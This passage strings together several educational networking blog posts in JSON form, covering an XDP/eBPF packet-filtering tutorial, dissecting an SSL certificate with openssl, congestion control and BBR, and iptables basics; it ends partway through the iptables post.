{"url": "https://jvns.ca/blog/2018/03/05/things-ive-learned-networking/", "title": "A few things I've learned about computer networking", "content": "\n     \n\n Somebody asked a few months ago “hey, what’s the best way to understand computer networking?”. I\ndon’t really know how to answer this question – I’ve learned a lot of the things I know at work,\nand I think picking up new things when I need them has been fine. \n\n But I thought it could maybe be useful to list a bunch of concrete skills and concepts I’ve learned\nalong the way. Like anything else, “computer networking” involves a large number of different\nconcepts and skills and tools and I’ve learned them all one at a time.  I picked most of these\nthings up over the last 4 years. \n\n \n How to set up an Apache web server by copying and pasting things from the internet. (pre-2010) \n What a http request looks like (GET, POST, etc). How to use curl to send GET and POST requests.\n(2010?) \n How to send a http request by hand with netcat (2013) \n how to do  ARP spoofing  (and what ARP\nis) \n What a MAC address is and how packets are addressed to a MAC address on a local network \n How  traceroute works  (which involves learning the basics of how the IP protocol works and what a TTL is) \n What a network packet is, how to look at a networking packet with Wireshark \n The basics of how TCP works (for example by looking at an http request with wireshark, and by\n building a tcp stack in Python ). Key things: what’s a SYN packet? \n how DNS works (like, what’s an A record, what’s a CNAME record, what does a DNS query look like –\nwireshark is good here too). \n More HTTP (like cache headers and how they interact with CDNs). More  about what CDNs are for \n MTU exists and can cause networking issues \n Having badly tuned TCP connection settings (like TCP_NODELAY) can cause noticeable networking performance issues ( why you should understand (a little) about TCP ) (2015) \n HTTP security headers like CORS \n What  “SNI” means \n how to use tcpdump to debug firewall issues (2016) \n how to capture packets with  tcpdump  in somewhat weird ways (for instance “only this very\nspecific kind of DNS response”) \n “can reliably use tcpdump without reading the man page” \n SSL/TLS: what’s a SSL cert? how do I get one issued? how is a SSL cert put together? (tools:\n openssl x509 ).  here’s a blog post about TLS \n more advanced HTTP+SSL stuff, like the  Strict-Transport-Security header \n very basic understanding of what BGP is and how packets get routed on the internet \n slightly more advanced DNS (what’s an authoritative dns server, what’s a recursive dns server) \n a vague understanding of  how the linux networking stack handles packets , like – do packets get sent to tcpdump before or after routing? (after!) \n how to  slow down my internet on purpose with tc \n how to set up NAT rules with iptables \n how to inspect a route table with iproute2 \n container/docker networking (network namespaces, route tables) (2017) \n \n\n tools I’ve found useful \n\n Per  this tweet : \n\n \n ping (are these computer connected??) \n whois (is this domain registered) \n ssh \n curl (for making HTTP requests) \n tcpdump (record packets! check for traffic on a port!) \n dig/nslookup (debugging DNS issues) \n netstat/ss (is that port being used?) \n ifconfig (what’s my IP address?) \n iproute2 (that is, the  ip  command. replacement for ifconfig. very useful.) \n wireshark (look at packets with a GUI) \n ngrep (grep for your network) \n iptables \n socat (connect a unix domain socket to a tcp socket) \n nsenter  for debugging container networking problems \n \n\n learning takes a lot of time \n\n I spend a fair amount of time trying to learn new computer things. I’ve found it really useful to\ntake it one step at a time – my learning process with a lot of this stuff is basically \n\n \n identify something small I don’t know (how to, from the command line, check the expiration date on\n https://google.com's  TLS certificate) \n figure it out (sometimes with help from my great coworkers) \n repeat \n \n\n That’s all! It’s really fun to see how learning a bunch of tiny things adds up over time. Like today\nI feel like I can handle most things about computer networking that I run into in my job, and I\ndon’t feel like there are that many Big New Ideas about networking I don’t know about. (though,\nwell, wifi is still a mystery to me :) ) \n\n"},
{"url": "https://jvns.ca/blog/2017/04/07/xdp-bpf-tutorial/", "title": "How to filter packets super fast: XDP & eBPF!", "content": "\n     \n\n Hello! Today I am at the netdev conference, and this is the second day. \n\n I’m going to write about the Most Exciting Thing from today, which was a\ngreat hour-long tutorial about eBPF and XDP by Andy Gospodarek and Jesper\nDangaard Brouer. I thought it was so exciting I wanted to write a whole\nblog post just with my notes from that tutorial. \n\n This tutorial walked us through how to build a simple DDoS prevention XDP\nfilter! This was amazing because there were talks yesterday about how to build DDoS\nprevention yesterday kind of abstractly, but they showed in this tutorial\nexactly how you build a simple example and talked about a lot of the\ndetails. The application they built had: \n\n \n an XDP program (that runs in the kernel, written in eBPF) that filters out\npackets (more quickly and more flexibly than iptables does!) from some IP addresses you specify \n a userspace command line tool that lets you add & remove IP addresses to be filtered \n counters so you can see how many packets have been blocked by the filter \n \n\n They were pretty clear that this is just a demo / example to understand the\nconcepts, not something to immediately start using in production :) \n\n All of the code for this tutorial is on GitHub in their  prototype-kernel repo . \n\n intro to eBPF \n\n eBPF is a virtual machine in the kernel. It’s pretty flexible (you write eBPF\nprograms by writing C code, so you can do a lot!) but there are limitations.\nSome important limitations/facts to know about eBPF: \n\n \n all interactions with userspace happen through eBPF “maps” which are\nkey-value stores \n there are about a dozen different kinds of maps you can use right now \n eBPF doesn’t have loops, so every eBPF program will finish within some\nbounded execution time \n in particular eBPF isn’t turing complete :) :) \n \n\n intro to XDP \n\n XDP is a new system in the kernel, that lets you write custom eBPF programs to\nfilter network packets. We’ll call those “XDP programs”. The XDP programs run as soon as the packet gets to the\nnetwork driver (so very very quickly). \n\n When an XDP program, it needs to exit with either  XDP_TX ,  XDP_DROP , or\n XDP_PASS . There might be more return codes in the future. \n\n They said Ubuntu 16.10 has XDP – IIRC the earliest kernel version with XDP\nsupport is 4.8. \n\n our XDP program: getting started! \n\n For this program, we want both kernel code (the XDP program, which is going to\nrun inside the kernel) and userspace code (for us to run to tell the program in\nthe kernel which IP addresses to block). \n\n \n kernel code \n user code \n command line tool \n \n\n You might think that the command line tool would need to run as root (because\nit’s talking to the kernel), but it turns out that the command line tool works\nby updating the BPF maps! And the way you update the BPF maps is through a file\ninterface in sysfs ( /sys/..something.. ). And if you’re updating something\nthrough a file, you can just change the permissions / ownership of that file! \n\n So the command line tool to add new IP addresses to blacklist doesn’t need to\nrun as root. \n\n Okay, so what is this BPF map we’re updating? It has type\n BPF_MAP_TYPE_PERCPU_HASH . This map is going to have IP addresses as keys and\nhow many packets we’ve blocked for that IP address as a value. This is a hash that is, well, per cpu. So every CPU\nhas its own map. This means that our userspace tool that reports how many\npackets have been blocked will need to add up all the values for each CPU. \n\n I think having the map be per CPU is more efficient or something. \n\n So our map has: (the  definition is here \n\n \n key size: 32 bits (an IPv4 address) \n value size: 64 bits (a count) \n max entries: 100000 \n \n\n Seems reasonable! \n\n writing our XDP program for real \n\n So how does this XDP program work? \n\n Almost the first line in this program is (from  here )\n struct ethhdr *eth = data \n\n The beginning of any packet is an Ethernet header. We need to parse that\nEthernet header. The really interesting point that they made here is – XDP\nprograms are compiled inside the kernel tree. This means that you have access\nto all the kernel data structures! And the kernel already has a struct that\nrepresents an Ethernet header, so you don’t have to write that much fancy\nparsing code, you can just reuse that struct from the kernel. \n\n The heart of the XDP program is this part (from line 227): where we look up the\nsource IP address in our BPF map. If it’s there then we increment the value (so\nthat we can know how many packets were dropped!) \n\n value = bpf_map_lookup_elem(&blacklist, &ip_src);\nif (value) {\n  /* Don't need __sync_fetch_and_add(); as percpu map */\n  *value += 1; /* Keep a counter for drop matches */\n  return XDP_DROP;\n}\n \n\n This whole program that parses the packet, finds the IP address in the IP\nheader, looks it up in the BPF map, and returns is only 270 lines of C! That\nseems really reasonable!! \n\n Also there are no loops because this is eBPF and loops aren’t allowed, which\nmakes it even easier to understand. \n\n One very interesting thing that they pointed out is this check: \n\n if ((void *)eth + offset > data_end)\n  return false;\n \n\n This is basically making sure that you’re not going outside of the packet. The\ninteresting here is that if you don’t do your bounds checking properly, the\n kernel will reject your code  – since eBPF code is running inside the\nkernel, it needs to make sure that it’s not accessing any data it shouldn’t. So\nit somehow does static analysis on your program to make sure it’s not doing\nanything illegal. That’s super interesting and I would like to learn more about\nhow this works! Let’s keep going, though. \n\n getting the XDP program into your kernel \n\n Okay, so we’ve written an XDP program, compiled it to an object file  kern.o , and we want to get it into the kernel.\nThey said there are 2 ways to do this: \n\n \n use iproute2 (though they didn’t say how exactly) \n write your own code to load it (what they did) \n \n\n This is the  user code  linked before. \n\n Basically what I understood in this part is that there is a (userspace) library\nprovided by the kernel for loading BPF code. They copied it out of the kernel\nand made some changes because they wanted it to be different.\n bpf_load.c \n\n I’m kind of fuzzy on what’s involved in the userspace part right now but\nthe code is there, so I can read it later if I need to know more. The point is\nthat the program loads the object file into the kernel. \n\n how do you know your XDP program is loaded? \n\n So we wanted to attach this XDP program to a network interface. How do we know\nif it worked? \n\n When I run  ip link list  on my laptop, I get a list of all network interfaces: \n\n 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN mode\nDEFAULT group default qlen 1\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n2: br0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP mode\nDEFAULT group default qlen 1000\n    link/ether c6:f7:88:c6:d6:97 brd ff:ff:ff:ff:ff:ff\n3: mlan0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP mode\nDORMANT group default qlen 1000\n    link/ether 18:67:b0:10:e8:eb brd ff:ff:ff:ff:ff:ff\n5: veth_android@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue\nmaster br0 state UP mode DEFAULT group default qlen 1000\n    link/ether c6:f7:88:c6:d6:97 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n \n\n This shows all these settings for the interface, like  mtu 1500 qdisc noqueue\nstate UP... .  If there’s an XDP program running on that interface it’ll also\nsay  xdp  in there. \n\n eBPF/XDP tips \n\n Here are some tips they gave! \n\n tip 1: if when your BPF program is running it says  __bpf_prog_run  in  perf\ntop , you should  turn on the kernel JIT . Running your BPF code through the\nJIT will make everything way faster \n\n tip 2: if your ulimits aren’t high enough you’ll run into problems. I’m a\nlittle fuzzy on what a ulimit is still but this seems like a good tip. You can\nlook at ulimits with  ulimit -a \n\n tip 3: dump out kern.o maps with readelf / objdump to look at them. “It’s\njust an ELF file, it’s not magic”. when you do, you can see the section with\nthe XDP program and the section with the BPF maps! you can also see the eBPF\nbytecode in the maps section but it’s not that human readable :) \n\n tip 4:  you can use  bpf_trace_printk  to print debugging message. These don’t\nactually get printed, but they end up in the kernel tracing system at\n /sys/kernel/debug/tracing/trace_pipe \n\n Also,  man bpf  is a good reference \n\n tip 5: You can blacklist subnets! There’s a trie BPF map type \n\n tip 6: you can persist your BPF maps when the XDP program is attached/detached. \n\n performance \n\n They wrote a filter that filters all UDP traffic (or some UDP traffic?\nunclear). They tried implementing the rule in iptables and compared it to their\ncustom XDP approach. \n\n \n iptables: 4.5 million packets/second \n XDP: 9.7 million packets/second \n \n\n so this XDP program really was more than twice as fast as iptables! Cool! \n\n performance definitely isn’t the only benefit over iptables though – it’s\ndefinitely really important that with XDP you can write arbitrary code. \n\n that’s it! \n\n I really liked that this tutorial focused on demystifying how this stuff\nworks – they said it’s really useful to use readelf/objdump to look at the ELF\nfiles that are generated along the way to understand how they’re structured. \n\n I still don’t understand everything but this made the idea of writing eBPF\nprograms to make my kernel filter packets seem WAY more concrete/feasible.\nProbably some things in this post are wrong but I hope you have learned\nsomething anyway! \n\n"},
{"url": "https://jvns.ca/blog/2017/01/31/whats-tls/", "title": "Dissecting an SSL certificate", "content": "\n     \n\n Hello! In my networking zine (which everyone will be able to see soon),\nthere is a page about TLS/SSL (basically  this tweet ).\nBut as happens when you write 200 words about a thing on a page, there is a lot\nmore interesting stuff to say. So in this post we will dissect an SSL\ncertificates and try to understand it! \n\n I am not a security person and I am not going to give you security\nadvice for your website (want to know what TLS ciphers you should use? I\nhave no idea!!!). But! I think it’s interesting to know what it means to\n“issue a SSL certificate” and I can talk about that a little. \n\n TLS: newer version of SSL \n\n I was confused about what this “TLS” thing was for a long time.\nBasically newer versions of SSL are called TLS (the version after SSL\n3.0 is TLS 1.0). I’m going to just call it “SSL” throughout because that\nis less confusing to me. \n\n What’s a certificate? \n\n Suppose I’m checking my email at  https://mail.google.com \n\n mail.google.com  is running a HTTPS server on port 443. I want to make\nsure that I’m  actually  talking to mail.google.com and not some other\nrandom server on the internet owned by EVIL PEOPLE. \n\n This “certificate” business was kind of mysterious to me for a very long\ntime. One day my cool coworker Ray told me that I could connect to a\nserver on the command line and download its certificate! \n\n (If you want to just look at an SSL certificate, you can click on\nthe green lock in your browser and reliably get all the information you need. But this is more fun.) \n\n So, let’s start by looking at mail.google.com’s certificate and\ndeconstruct it a bit. \n\n First, we run  openssl s_client -connect mail.google.com:443 \n\n This is going to print a bunch of stuff, but we’ll just focus on the\ncertificate. Here, it’s this thing: \n\n $ openssl s_client -connect mail.google.com:443\n...\n-----BEGIN CERTIFICATE-----\nMIIElDCCA3ygAwIBAgIIMmzfdZnO9pMwDQYJKoZIhvcNAQELBQAwSTELMAkGA1UE\nBhMCVVMxEzARBgNVBAoTCkdvb2dsZSBJbmMxJTAjBgNVBAMTHEdvb2dsZSBJbnRl\ncm5ldCBBdXRob3JpdHkgRzIwHhcNMTcwMTE4MTg1MjExWhcNMTcwNDEyMTg1MDAw\nWjBpMQswCQYDVQQGEwJVUzETMBEGA1UECAwKQ2FsaWZvcm5pYTEWMBQGA1UEBwwN\nTW91bnRhaW4gVmlldzETMBEGA1UECgwKR29vZ2xlIEluYzEYMBYGA1UEAwwPbWFp\nbC5nb29nbGUuY29tMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAiYcr\nC9Rn7g9xjsg7khqfRPxUnvpgGyCHqJMXxZGtdf+G02d07cPlMEeaGG12vHyVfRZD\ntc/F1ZfwenH6gf0uMobtgw7n2NQa7T7qxuqSUDhZsO1sI1LL/Yqy8QHoooOZQWMz\nytuRA18zti4vQV1dCijADh0+NWI1GDUAKidbaH/fBRrStqBev5Bhq3ZaGj3fDjAO\n7CG0Wk3n4Ov2yg44XOdgkLMzjdnbV8l6cZDC7lCK1VsEU1mEd0O0Dw4OcnHLuBPw\nIkioZayhPOXDXUS+bhpmtEiCkt8kbHG6jNMC4m8t62Jaf/Si3XNcHhDa4wPCTvid\nX//PuuNlRZVg3NjK/wIDAQABo4IBXjCCAVowHQYDVR0lBBYwFAYIKwYBBQUHAwEG\nCCsGAQUFBwMCMCwGA1UdEQQlMCOCD21haWwuZ29vZ2xlLmNvbYIQaW5ib3guZ29v\nZ2xlLmNvbTBoBggrBgEFBQcBAQRcMFowKwYIKwYBBQUHMAKGH2h0dHA6Ly9wa2ku\nZ29vZ2xlLmNvbS9HSUFHMi5jcnQwKwYIKwYBBQUHMAGGH2h0dHA6Ly9jbGllbnRz\nMS5nb29nbGUuY29tL29jc3AwHQYDVR0OBBYEFI69aYCEtb2swbJJR3cMOTdcfvZ4\nMAwGA1UdEwEB/wQCMAAwHwYDVR0jBBgwFoAUSt0GFhu89mi1dvWBtrtiGrpagS8w\nIQYDVR0gBBowGDAMBgorBgEEAdZ5AgUBMAgGBmeBDAECAjAwBgNVHR8EKTAnMCWg\nI6Ahhh9odHRwOi8vcGtpLmdvb2dsZS5jb20vR0lBRzIuY3JsMA0GCSqGSIb3DQEB\nCwUAA4IBAQAhiqQIwkGp1NmlLq89gjoAfpwaapHuRixxl2S54fyu/4WOHJJafqVA\nTya9J7GTUCyQ6nszCdVizVP26h9TKOs9LJw5jWV9SOnPU2UZKvrNnOUi2FUkCcuD\nlsADdKSXNzye3jB88TENrWC/y3ysPdAgPO/sXzyRvNw8SVKl2+RqMDpSRpBptF9e\nLp+WLAM3xKS5SPwCNdCiA332o7qiKRKQm/6bbIWnm7hp/ZnLxbyKaIVytRdiwRNp\nO/TTpRv2C708GA3PH6i1pYE86xm3w7lGhN9OiCZpKOJD6ZUH3W20idgPKYPBCO/N\nOp2AF3I4iUGeQjXFVLgS6mjUvdLndL9G\n-----END CERTIFICATE-----\n \n\n So far, this is unintelligible nonsense. “MIIElDcca… WHAT?!” \n\n It turns out that this nonsense is a format called “X509”, and the  openssl \ncommand knows how to decode it. \n\n So I saved this blob of text to a file called  cert.pem . You can save it to your computer  from this gist  if you want to follow along. \n\n Our next mission is to  parse this certificate . We do that like this: \n\n $ openssl x509 -in cert.pem -text\n\nCertificate:\n    Data:\n        Version: 3 (0x2)\n        Serial Number: 3633524695565792915 (0x326cdf7599cef693)\n    Signature Algorithm: sha256WithRSAEncryption\n        Issuer: C=US, O=Google Inc, CN=Google Internet Authority G2\n        Validity\n            Not Before: Jan 18 18:52:11 2017 GMT\n            Not After : Apr 12 18:50:00 2017 GMT\n        Subject: C=US, ST=California, L=Mountain View, O=Google Inc, CN=mail.google.com\n        Subject Public Key Info:\n            Public Key Algorithm: rsaEncryption\n                Public-Key: (2048 bit)\n                Modulus:\n                    00:89:87:2b:0b:d4:67:ee:0f:71:8e:c8:3b:92:1a:\n                    9f:44:fc:54:9e:fa:60:1b:20:87:a8:93:17:c5:91:\n                    .... blah blah blah ............\n                    c2:4e:f8:9d:5f:ff:cf:ba:e3:65:45:95:60:dc:d8:\n                    ca:ff\n                Exponent: 65537 (0x10001)\n        X509v3 extensions:\n            X509v3 Subject Alternative Name: \n                DNS:mail.google.com, DNS:inbox.google.com\n\n            X509v3 Subject Key Identifier: \n                8E:BD:69:80:84:B5:BD:AC:C1:B2:49:47:77:0C:39:37:5C:7E:F6:78\n    Signature Algorithm: sha256WithRSAEncryption\n         21:8a:a4:08:c2:41:a9:d4:d9:a5:2e:af:3d:82:3a:00:7e:9c:\n         1a:6a:91:ee:46:2c:71:97:64:b9:e1:fc:ae:ff:85:8e:1c:92:\n         ......... blah blah blah more goes here ...........\n \n\n This is a lot of stuff. Here are the parts of this that I understand \n\n \n CN=mail.google.com  is the “common name”. Counterintuitively you should ignore this field and look at the “subject alternative name” field instead \n an  expiry date : Apr 12 18:50:00 2017 GMT \n The  X509v3 Subject Alternative Name:  section has the list of  domains that this\ncertificate works for. This is mail.google.com and inbox.google.com, which makes sense – they’re both email domains. \n The  Public Key Info  section tells us the  public key  that we’re going to use to communicate with mail.google.com. We do not have time to explain public key cryptography right now, but this is  basically the encryption key we’re going to use to talk secretly. \n Lastly, the  signature  is a really important thing. Basically anyone could make a\ncertificate for mail.google.com. I could make one right now! But if I gave you that certificate, you would have no reason to believe that it is a real certificate \n \n\n So let’s talk about certificate signing. \n\n certificate signing \n\n Every certificate on the internet is basically two parts put together \n\n \n A certificate (the domain name it’s valid for and public key and other stuff) \n A  signature  by someone else. This basically says, “hey, this is okay, Visa says so” \n \n\n I have a bunch of certificates on my computer in /etc/ssl/certs. Those are the\ncertificates my computer trusts to sign other certificates. For example, I\nhave  /etc/ssl/certs/Staat_der_Nederlanden_EV_Root_CA.pem  on my laptop. Some\ncertificate from the Netherlands! Who knows! If they signed a  mail.google.com \ncertificate, my computer would be like “yep, looks great, sounds awesome”. \n\n If some random person across the street signed a certificate, my computer would\nbe like “I have no idea who you are”, and reject the certificate. \n\n The mail.google certificate is \n\n \n s:/C=US/ST=California/L=Mountain View/O=Google Inc/CN=mail.google.com \n which is signed by a “Google Internet Authority G2” certificate \n which is signed by a “GeoTrust Global CA” certificate \n which is signed by an “Equifax Secure Certificate Authority” certificate \n \n\n I have an /etc/ssl/certs/GeoTrust_Global_CA.pem file on my computer, which I\nthink is why I trust this mail.google.com certificate. (Geotrust signed Google’s certificate, and Google signed mail.google.com) \n\n what does getting a certificate issued look like? \n\n So when you get a certificate issued, basically how it works is: \n\n \n You generate the first half of the certificate (“jvns.ca! expires on X date! This is my public key!”). This part is public. \n At the same time, you generate a  private key  for you certificate. You keep this very secret and safe and do not show it to anybody. You’ll use this key every time you establish an SSL connection. \n You pay a  certificate authority  (CA) that other computers trust to sign\nyour certificate for you. Certificate authorities are supposed to have\nintegrity, so they are supposed to actually make sure that when they sign certificates, the person they give the cert to actually owns the domain. \n You configure your website with your signed certificate and use it to prove that you are really you! Success!\n \n \n\n This “certificate authorities are supposed to have integrity thing” I think is\nwhy people get so mad when there are  issues like this with\nSymantec  where they\ngenerated test certificates “to unregistered domains and domains for which\nSymantec did not have authorization from the domain owner” \n\n certificate transparency \n\n The last thing we are going to talk about is  certificate transparency . This is a super\ninteresting thing and has a good website and I am almost certainly going to\nmangle it. \n\n I will try anyway! \n\n So, we said that certificate authorities are “supposed to have integrity”. But\nthere are SO MANY certificate authorities that my computer trusts! And at any\ntime one of them could sign a rogue certificate for mail.google.com. That’s no\ngood. \n\n This isn’t a hypothetical issue – the  certificate transparency  website\ntalks about more than one instance where a CA has been compromised or\notherwise has made a mistake. \n\n So, here’s the deal. At any given time, Google  knows  all the valid\ncertificates that are supposed to exist for  mail.google.com  (there is\nprobably only one or something). So certificate transparency is basically a way\nto make sure that if there is a certificate in circulation for mail.google.com\nthat they DON’T know about, that they can find out. \n\n Here are the steps, as I understand them \n\n \n Every time any CA signs a certificate, they are supposed to put into a global public “certificate log” \n Also the Googlebot puts every certificate it finds on the internet into the certificate log \n If a certificate  isn’t  in the log, then my browser will not accept it (or will stop accepting it in the future or something) \n Anyone can look at the log at any time to find out if there are rogue certificates in there \n \n\n So if that CA in the Netherlands signs an evil mail.google.com certificate,\nthey either have to put it in the public log (and Google will find out about their evil ways) or\nleave it out of the public log (and browsers will reject it). \n\n setting up SSL stuff is hard \n\n Okay! We have downloaded a SSL certificate and dissected it and learned a few\nthings about it. Hopefully some of you have learned something! \n\n Picking the right settings for your SSL certificates and SSL configuration on\nyour webserver is confusing. As far as I understand it there are about 3 billion settings.  Here is an example of an SSL Labs result for mail.google.com .\nThere is all this stuff like  OLD_TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256  on that page (for real, that is a real thing.). I’m happy there are tools like SSL Labs that help mortals make sense of all of it. \n\n Someone told me  https://cipherli.st/  is a way to pick\nsecure SSL configuration if you’re not sure what to do. I don’t know if it’s\ngood or not. \n\n let’s encrypt is amazing \n\n Also  let’s encrypt  is really cool! They let you have a certificate for your\nsite and make it secure, and you don’t even need to understand all this stuff\nabout how certificates work on the inside! And it’s FREE. \n\n"},
{"url": "https://jvns.ca/blog/2018/07/12/netdev-day-2--moving-away-from--as-fast-as-possible/", "title": "netdev day 2: moving away from \"as fast as possible\" in networking code", "content": "\n     \n\n Hello! Today was day 2 of netdev. I only made it to the morning of the conference, but the morning\nwas VERY EXCITING. The highlight of this morning was a keynote by  Van Jacobson \nabout the future of congestion control on the internet (!!!) called “Evolving from As Fast As\nPossible: Teaching NICs about time” \n\n I’m going to try to summarize what I learned from this talk. I almost certainly have some things\nwrong, but let’s go! \n\n This talk was about how the internet has changed since 1988, why we need new algorithms today, and\nhow we can change Linux’s networking stack to implement those algorithms more easily. \n\n what’s congestion control? \n\n Everyone on the internet is sending packets all at once, all the time. The links on the internet are\nof dramatically different speeds (some are WAY slower than others), and sometimes they get full!\nWhen a device on the internet receives packets at a rate faster than it can handle, it drops the\npackets. \n\n The most naive you way you could imagine sending packets is: \n\n \n Send all the packets you have to send all at once \n If you discover any of those packets got dropped, resend the packet right away \n \n\n It turns out that if you implemented TCP that way, the internet would collapse and grind to a halt. We know that it\nwould collapse because it did kinda collapse, in 1986. To fix this, folks invented congestion control algorithms – the original paper describing how they avoided collapsing the internet is  Congestion Avoidance and Control , by Van Jacobson from 1988. (30 years ago!) \n\n How has the internet changed since 1988? \n\n The main thing he said has changed about the internet is – it used to be that switches would always\nhave faster network cards than servers on the internet. So the servers in the middle of the internet\nwould be a lot faster than the clients, and it didn’t matter as much how fast clients sent packets. \n\n Today apparently that’s not true! As we all know, computers today aren’t really faster than\ncomputers 5 years ago (we ran into some problems with the speed of light). So what happens (I think)\nis that the big switches in routers are not really that much faster than the NICs on servers in\ndatacenters. \n\n This is bad because it means that clients are much more easily able to saturate the links in the\nmiddle, which results in the internet getting slower. (and there’s  buffer bloat  which results in high latency) \n\n So to improve performance on the internet and not saturate all the queues on every router, clients\nneed to be a little better behaved and to send packets a bit more slowly. \n\n sending more packets more slowly results in better performance \n\n Here’s an idea that was really surprising to me – sending packets more slowly often actually\nresults in better performance (even if you are the only one doing it). Here’s why! \n\n Suppose you’re trying to send 10MB of data, and there’s a link somewhere in the middle between you\nand the client you’re trying to talk to that is SLOW, like 1MB/s or something. Assuming that you can\ntell the speed of this slow link (more on that later), you have 2 choices: \n\n \n Send the entire 10MB of data at once and see what happens \n Slow it down so you send it at 1MB/s \n \n\n Now – either way, you’re probably going to end up with some packet loss. So it seems like you might\nas well just send all the data at once if you’re going to end up with packet loss either way, right? No!!\nThe key observation is that packet loss in the  middle  of your stream is much better than packet\nloss at the  end  of your stream. If a few packets in the middle are dropped, the client you’re\nsending to will realize, tell you, and you can just resend them. No big deal!  But if packets at\nthe END are dropped, the client has no way of knowing you sent those packets at all! So you\nbasically need to time out at some point when you don’t get an ACK for those packets and resend it.\nAnd timeouts typically take a long time to happen! \n\n So why is sending data more slowly better? Well, if you send data faster than the bottleneck for the\nlink, what will happen is that all the packets will pile up in a queue somewhere, the queue will get\nfull, and then the packets at the END of your stream will get dropped. And, like we just explained,\nthe packets at the end of the stream are the worst packets to drop! So then you have all these\ntimeouts, and sending your 10MB of data will take way longer than if you’d just sent your packets at\nthe correct speed in the first place. \n\n I thought this was really cool because it doesn’t require cooperation from anybody else on the\ninternet – even if everybody else is sending all their packets really fast, it’s  still  more\nadvantageous for you to send your packets at the correct rate (the rate of the bottleneck in the\nmiddle) \n\n how to tell the right speed to send data at: BBR! \n\n Earlier I said “assuming that you can tell the speed of the slow link between your client and\nserver…“. How do you do that? Well, some folks from Google (where Jacobson works) came up with an\nalgorithm for measuring the speed of bottlenecks! It’s called BBR. This post is already long enough,\nbut for more about BBR, see  BBR: Congestion-based congestion control \nand  the summary from the morning paper . \n\n (as an aside,  https://blog.acolyer.org ’s daily “the morning paper” summaries are basically the only\nway I learn about / understand CS papers, it’s possibly the greatest blog on the internet) \n\n networking code is designed to run “as fast as possible” \n\n So! Let’s say we believe we want to send data a little more slowly, at the speed of the bottleneck\nin our connection. This is all very well, but networking software isn’t really designed to send data\nat a controlled rate! This (as far as I understand it) is how most networking stuff is designed: \n\n \n There’s a queue of packets coming in \n It reads off the queue and sends the packets out as fast as possible \n That’s it \n \n\n This is pretty inflexible! Like – suppose I have one really fast connection I’m sending packets on,\nand one really slow connection. If all I have is a queue to put packets on, I don’t get that much\ncontrol over when the packets I’m sending actually get sent out. I can’t slow down the queue! \n\n a better way: give every packet an “earliest departure time” \n\n His proposal was to modify the skb data structure in the Linux kernel (which is the data structure\nused to represent network packets) to have a TIMESTAMP on it representing the earliest time that\npacket should go out. \n\n I don’t know a lot about the Linux network stack, but the interesting thing to me about this\nproposal is that it doesn’t sound like a huge change! It’s just an extra timestamp. \n\n replace queues with timing wheels!!! \n\n Once we have all these packets with times on them, how do we get them sent out at the right time?\nTIMING WHEELS! \n\n At Papers We Love a while back ( some good links in the meetup description ) there was a talk\nabout timing wheels. Timing wheels are the algorithm the Linux process scheduler decides when to run processes. \n\n He said that timing wheels actually perform better than queues for scheduling work – they both\noffer constant time operations, but the timing wheels constant is smaller because of some stuff to\ndo with cache performance. I didn’t really follow the performance arguments. \n\n One point he made about timing wheels is that you can easily implement a queue with a timing wheel\n(though not vice versa!) – if every time you add a new packet, you say that you want it to be sent\nRIGHT NOW at the earliest, then you effectively end up with a queue. So this timing wheel approach\nis backwards compatible, but it makes it much easier to implement more complex traffic shaping\nalgorithms where you send out different packets at different rates. \n\n maybe we can fix the internet by improving Linux! \n\n With any internet-scale problem, the tricky thing about making progress on it is that you need\ncooperation from SO MANY different parties to change how internet protocols are implemented. You\nhave Linux machines, BSD machines, Windows machines, different kinds of phones, Juniper/Cisco\nrouters, and lots of other devices! \n\n But Linux is in kind of an interesting position in the networking landscape! \n\n \n Android phones run Linux \n Most consumer wifi routers run Linux \n Lots of servers run Linux \n \n\n So in any given network connection, you’re actually relatively likely to have a Linux machine at\nboth ends (a linux server, and either a Linux router or Android device). \n\n So the point is that if you want to improve congestion on the internet in general, it would make a\nhuge difference to just change the Linux networking stack. (and maybe the iOS networking stack\ntoo) Which is why there was a keynote at this Linux networking conference about it! \n\n the internet is still changing! Cool! \n\n I usually think of TCP/IP as something that we figured out in the 80s, so it was really fascinating\nto hear that folks think that there are still serious issues with how we’re designing our networking\nprotocols, and that there’s work to do to design them differently. \n\n And of course it makes sense – the landscape of networking hardware and the relative speeds of\neverything and the kinds of things people are using the internet for (netflix!) is changing all the\ntime, so it’s reasonable that at some point we need to start designing our algorithms differently\nfor the internet of 2018 instead of the internet of 1998. \n\n"},
{"url": "https://jvns.ca/blog/2017/06/07/iptables-basics/", "title": "Iptables basics", "content": "\n     \n\n Yesterday I tweeted “hey, I learned some stuff about iptables today”!\nA few people replied “oh no, I’m sorry”. iptables has kind of a reputation\nfor being hard to understand (and I’ve also found it intimidating) so I\nwanted to write down a few things I learned about iptables in the last\nfew days. I don’t like being scared of things and understanding a few of\nthe basics of iptables seems like it shouldn’t be scary! \n\n I have been looking at Kubernetes things, and Kubernetes creates 5\nbajillion iptables rules, so it has been time to learn a little bit\nabout iptables. \n\n The best references I’ve found for understanding iptables so far have\nbeen: \n\n \n the  iptables man page \n iptables.info (now seemingly at  https://www.frozentux.net/iptables-tutorial/iptables-tutorial.html )\n(which is GREAT, it explains all kinds of stuff like “what does\nMASQUERADE even mean” that is not explained in the iptables man page) \n \n\n how to view what iptables stuff you have set up \n\n iptables has a bunch of er, “tables” in it. These are places you can put\niptables rules. They’re used at different times during packet\nprocessing. There’s a   diagram here , from this  “traversing of tables and chains”  page. \n\n The first surprising thing I learned about iptables is that to look at\nall the iptables rules you have to run 4 commands \n\n sudo iptables -L # there's an implicit `-t filter` here,\n                 # this just lists the filter table\nsudo iptables -L -t nat\nsudo iptables -L -t mangle\nsudo iptables -L -t raw\n \n\n This isn’t super fun, I find it annoying to have to run 4 commands to\nsee all the iptables rules on my computer. I started running   sudo\niptables-save  which generates a dump of all the iptables rules I have.\nI like being able to see everything by running one command! \n\n $ sudo iptables-save\n*nat\n:PREROUTING ACCEPT [1664:324261]\n:INPUT ACCEPT 